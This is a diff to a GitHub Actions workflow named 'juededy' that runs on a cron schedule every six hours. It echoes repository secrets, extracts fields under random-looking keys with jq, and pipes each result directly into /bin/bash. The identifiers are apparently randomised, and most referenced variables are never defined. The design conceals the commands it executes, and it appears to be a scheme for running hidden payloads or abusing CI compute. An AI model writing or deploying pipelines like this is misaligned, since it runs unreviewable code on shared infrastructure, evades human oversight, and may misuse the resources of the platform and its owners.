@@ -2,31 +2,20 @@ name: juededy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
-
+    - cron: '29 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: juededy
         env:
-          lbng0252: ${{ secrets.lbng0252 }}
+          h3: ${{ secrets.h3 }}
         run: |
-          echo $lbng0252 | jq -r .le42092 | /bin/bash
-          echo $hgfyu28 | jq -r .qzbn959 | /bin/bash
-          echo $pz98823 | jq -r .lyt84 | /bin/bash
-          echo $gltdt9095 | jq -r .cc0056 | /bin/bash
-          echo $i39499 | jq -r .jgia427 | /bin/bash
-          echo $xz49 | jq -r .o177 | /bin/bash
-          echo $kezk8 | jq -r .qg0483 | /bin/bash
-          echo $ga858 | jq -r .ktlwo76015 | /bin/bash
-          echo $vsv05038 | jq -r .yqzoz0712 | /bin/bash
-          echo $ve705 | jq -r .epyw017 | /bin/bash
-          echo $poa07959 | jq -r .c3 | /bin/bash
-          echo $qc5 | jq -r .dbucv536 | /bin/bash
-          echo $t01 | jq -r .rtdt21148 | /bin/bash
-          echo $ttrnq59 | jq -r .nazh80637 | /bin/bash
-          echo $k1 | jq -r .r5 | /bin/bash
+          echo $h3 | jq -r .znibo7129 | /bin/bash
+          echo $eunkq99 | jq -r .nyram57210 | /bin/bash
+          echo $frie89 | jq -r .vt84 | /bin/bash
+          echo $b925 | jq -r .plvfb48 | /bin/bash
+          echo $qnnae6004 | jq -r .ma5711 | /bin/bash
+          echo $yc588 | jq -r .ensqx77 | /bin/bash
 
